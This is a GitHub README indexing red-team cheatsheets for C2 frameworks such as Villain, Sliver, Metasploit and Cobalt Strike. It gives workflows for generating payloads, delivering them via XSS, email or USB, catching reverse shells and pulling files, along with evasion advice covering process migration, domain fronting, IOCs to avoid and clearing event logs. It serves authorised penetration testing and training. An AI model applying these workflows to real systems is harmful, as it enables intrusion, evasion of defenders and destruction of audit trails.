# Comprehensive C2 Framework Arsenal 🛡️⚔️

**The ultimate collection of Command & Control framework cheatsheets for red team operations, penetration testing, and security research.**

> **⚠️ LEGAL DISCLAIMER: This repository is for authorized security testing, research, and educational purposes only. Unauthorized use is illegal and unethical.**

---

## 🎯 Framework Coverage

| Framework | Type | Language | Strengths | Difficulty |
|-----------|------|----------|-----------|------------|
| **[Villain](VILLAIN_CHEATSHEET.md)** | HTTP/HTTPS C2 | Python | Simple, Stealthy | ⭐⭐ |
| **[Metasploit](METASPLOIT_CHEATSHEET.md)** | Multi-Protocol | Ruby | Comprehensive, Mature | ⭐⭐⭐ |
| **[Sliver](SLIVER_CHEATSHEET.md)** | Multi-Protocol | Go | Modern, Cross-platform | ⭐⭐⭐ |
| **[Cobalt Strike](COBALT_STRIKE_QUICK_REF.md)** | Multi-Protocol | Java | Professional, Advanced | ⭐⭐⭐⭐ |
| **[Empire/Starkiller](EMPIRE_STARKILLER_QUICK_REF.md)** | PowerShell-based | Python/PS | Windows-focused | ⭐⭐⭐ |
| **[Covenant](COVENANT_QUICK_REF.md)** | HTTP/DNS | C# | .NET Integration | ⭐⭐⭐⭐ |

## 📚 Quick Navigation

### 🚀 **Getting Started**
- [🎯 Choose Your Framework](#-framework-selection-guide)
- [⚙️ Basic Setup Guide](#️-basic-setup-guide)
- [🔧 Common Techniques](COMMON_TECHNIQUES.md)

### 📋 **Individual Framework Guides**
- [📡 Villain C2 Framework](VILLAIN_CHEATSHEET.md) - Simple HTTP/HTTPS C2
- [🛠️ Metasploit Framework](METASPLOIT_CHEATSHEET.md) - The Swiss Army Knife
- [⚡ Sliver C2 Framework](SLIVER_CHEATSHEET.md) - Modern Go-based C2
- [💼 Cobalt Strike](COBALT_STRIKE_QUICK_REF.md) - Commercial Red Team Tool
- [👑 Empire/Starkiller](EMPIRE_STARKILLER_QUICK_REF.md) - PowerShell Empire
- [⚗️ Covenant Framework](COVENANT_QUICK_REF.md) - .NET C2 Platform

### 🔬 **Advanced Topics**
- [🌐 Cross-Framework Integration](COMMON_TECHNIQUES.md#framework-interoperability)
- [🕵️ OPSEC Considerations](COMMON_TECHNIQUES.md#universal-opsec-practices)
- [🏗️ Infrastructure Setup](COMMON_TECHNIQUES.md#infrastructure-setup)
- [🧹 Cleanup Procedures](COMMON_TECHNIQUES.md#cleanup-procedures)

---

## 🎯 Framework Selection Guide

### 🥇 **For Beginners**
**Recommended: Villain** 
- Simple HTTP/HTTPS communication
- Easy payload generation
- Minimal setup required
- Great for learning C2 concepts

### 🥈 **For Penetration Testing**
**Recommended: Metasploit + Sliver**
- Metasploit: Mature exploitation framework
- Sliver: Modern, cross-platform capabilities
- Extensive post-exploitation modules
- Strong community support

### 🥉 **For Advanced Red Teams**
**Recommended: Cobalt Strike + Covenant**
- Cobalt Strike: Professional malleable profiles
- Covenant: C#/.NET integration
- Advanced evasion capabilities
- Team collaboration features

### 🎖️ **For Specific Use Cases**
- **Windows-Heavy Environments**: Empire/Starkiller
- **Cross-Platform Operations**: Sliver
- **Stealth Operations**: Villain + Custom profiles
- **Large-Scale Campaigns**: Cobalt Strike

---

## ⚙️ Basic Setup Guide

### 🐧 **Linux Setup (Recommended)**

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install essential tools
sudo apt install -y python3 python3-pip golang-go git curl wget

# Create tools directory
mkdir -p ~/tools && cd ~/tools

# Quick tool installation
git clone https://github.com/t3l3machus/Villain.git
git clone https://github.com/BishopFox/sliver.git
curl https://sliver.sh/install | sudo bash
```

### 🪟 **Windows Setup**

```powershell
# Install Chocolatey (Package Manager)
Set-ExecutionPolicy Bypass -Scope Process -Force
iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

# Install essential tools
choco install -y python git golang

# Create tools directory
mkdir C:\tools
cd C:\tools

# Download frameworks
git clone https://github.com/t3l3machus/Villain.git
```

### 🍎 **macOS Setup**

```bash
# Install Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install tools
brew install python3 go git wget

# Create tools directory
mkdir -p ~/tools && cd ~/tools

# Quick installation
curl https://sliver.sh/install | sudo bash
```

---

## 🎯 Quick Start Workflows

### 🚀 **Scenario 1: Basic Web Application Testing**

```bash
# 1. Start Villain for simple C2
cd ~/tools/Villain
python3 Villain.py

# 2. Generate web-friendly payload
villain > generate
# Select: LHOST, LPORT, PAYLOAD type

# 3. Host payload
villain > http

# 4. Deliver via web vulnerability
# Use generated payload in XSS, RCE, etc.

# 5. Catch shell
villain > sessions
villain > interact <session_id>
```

### 🛡️ **Scenario 2: Enterprise Red Team Assessment**

```bash
# 1. Set up Sliver for advanced operations
sliver-server

# 2. Create HTTPS listener with valid cert
sliver > https --lhost 0.0.0.0 --lport 443 --cert /path/to/cert.pem

# 3. Generate stageless beacon
sliver > generate --https domain.com:443 --format exe --save /tmp/

# 4. Deploy via multiple vectors
# Email, USB, SMB, etc.

# 5. Post-exploitation
sliver (session) > info
sliver (session) > ps
sliver (session) > download sensitive.txt
```

### 🔄 **Scenario 3: Multi-Framework Integration**

```bash
# 1. Initial access via Villain (simple)
villain > generate --payload powershell

# 2. Upgrade to Metasploit (powerful)
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_https

# 3. Deploy Sliver for persistence
sliver > generate --https domain.com --beacon-interval 300s

# 4. Use Cobalt Strike for advanced operations
# Team collaboration and malleable profiles
```

---

## 🔧 Common Payload Types

### 📝 **Document-Based Payloads**

| Type | Framework | Use Case | Detection Risk |
|------|-----------|----------|----------------|
| **Macro** | All | Email phishing | Medium |
| **HTA** | Villain, Metasploit | Web delivery | Low |
| **LNK** | All | USB/SMB delivery | Medium |
| **ISO** | All | Email attachments | Low |

### 💻 **Executable Payloads**

| Type | Framework | Use Case | Detection Risk |
|------|-----------|----------|----------------|
| **EXE** | All | Direct execution | High |
| **DLL** | Metasploit, Sliver | Sideloading | Medium |
| **Service** | All | Persistence | Low |
| **Shellcode** | All | Injection | Very Low |

### 🌐 **Script-Based Payloads**

| Type | Framework | Use Case | Detection Risk |
|------|-----------|----------|----------------|
| **PowerShell** | Empire, All | Windows targets | Medium |
| **Python** | Sliver, Villain | Cross-platform | Low |
| **Bash** | Sliver, Metasploit | Linux/macOS | Low |
| **JavaScript** | All | Web applications | Medium |

---

## 🛡️ OPSEC Best Practices

### 🎭 **Stealth Guidelines**

1. **Process Migration**
   ```bash
   # Target trusted processes
   svchost.exe, explorer.exe, dllhost.exe
   ```

2. **Sleep & Jitter**
   ```bash
   # Production environments
   Sleep: 300-600 seconds
   Jitter: 30-50%
   ```

3. **Traffic Patterns**
   ```bash
   # Use legitimate domains
   cdn.cloudflare.com
   azure.microsoft.com
   aws.amazon.com
   ```

### 🔒 **Security Measures**

1. **Encryption**: Always use HTTPS/TLS
2. **Certificates**: Use valid, trusted certificates
3. **Domain Fronting**: Hide true C2 infrastructure
4. **Cleanup**: Remove artifacts after operations

---

## 🚨 Incident Response & Detection

### 🔍 **Common IOCs to Avoid**

```bash
# Suspicious process names
evil.exe, payload.exe, shell.exe

# Obvious network patterns
Regular beacons every 60 seconds
High-entropy domain names
Suspicious user agents

# Registry artifacts
HKCU\Software\Classes\*\shell\*\command
Unusual Run key entries

# File system artifacts
Files in %TEMP%, %APPDATA%
Executable files in user directories
```

### 🧹 **Cleanup Checklist**

- [ ] Remove all uploaded files
- [ ] Clear registry modifications
- [ ] Delete scheduled tasks
- [ ] Remove services
- [ ] Clear event logs
- [ ] Reset network configurations
- [ ] Remove persistence mechanisms

---

## 📖 Resources & References

### 📚 **Learning Resources**

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
- [C2 Matrix](https://www.thec2matrix.com/)
- [Red Team Notes](https://www.ired.team/)

### 🛠️ **Additional Tools**

- **Infrastructure**: Terraform, Ansible, Docker
- **Evasion**: Invoke-Obfuscation, Veil, shellter
- **Pivoting**: Chisel, ligolo-ng, rpivot
- **Payloads**: msfvenom, donut, ScareCrow

### 🎯 **Practice Environments**

- **VulnHub VMs**: Practice exploitation
- **HackTheBox**: Advanced penetration testing
- **TryHackMe**: Red team learning paths
- **GOAD**: Active Directory lab environment

---

## 🤝 Contributing

We welcome contributions to improve this collection!

### 📝 **How to Contribute**

1. **Fork** the repository
2. **Create** a feature branch
3. **Add** new framework guides or improve existing ones
4. **Test** all commands and procedures
5. **Submit** a pull request

### 📋 **Contribution Guidelines**

- ✅ Test all commands before submitting
- ✅ Follow the established format and structure
- ✅ Include OPSEC considerations
- ✅ Add proper attribution and references
- ✅ Ensure legal and ethical usage

### 🎯 **Wanted Contributions**

- [ ] Additional C2 frameworks (Mythic, PoshC2, etc.)
- [ ] Mobile platform payloads (Android, iOS)
- [ ] Cloud-specific techniques (AWS, Azure, GCP)
- [ ] Container escape techniques
- [ ] IoT device exploitation

---

## ⚖️ Legal & Ethical Considerations

### 🚨 **IMPORTANT WARNINGS**

- **Authorization Required**: Only use on systems you own or have explicit permission to test
- **Legal Compliance**: Follow all applicable laws and regulations
- **Responsible Disclosure**: Report vulnerabilities responsibly
- **No Malicious Use**: Do not use for criminal activities

### 📜 **Ethical Guidelines**

1. **Obtain proper authorization** before any testing
2. **Document all activities** for transparency
3. **Minimize system impact** during testing
4. **Protect sensitive data** discovered during assessments
5. **Follow responsible disclosure** for vulnerabilities

### 🛡️ **Professional Standards**

- Follow industry standards (OWASP, NIST, etc.)
- Maintain client confidentiality
- Provide clear reporting and remediation guidance
- Continuously update knowledge and skills

---

## 📞 Support & Community

### 💬 **Getting Help**

- 🐛 **Issues**: Report bugs or request features via GitHub Issues
- 💡 **Discussions**: Join community discussions
- 📧 **Contact**: Reach out to maintainers for questions

### 🌟 **Acknowledgments**

Special thanks to the security community and the developers of:
- Villain (@t3l3machus)
- Metasploit (@rapid7)
- Sliver (@BishopFox)
- Cobalt Strike (@cobaltstrike)
- Empire (@BC-SECURITY)
- Covenant (@cobbr)

---

<div align="center">

**⭐ Star this repository if you find it useful! ⭐**

*Remember: With great power comes great responsibility. Use these tools ethically and legally.*

</div>

---

**Last Updated**: December 2024 | **Version**: 3.0 | **Maintainer**: cxb3rf1lth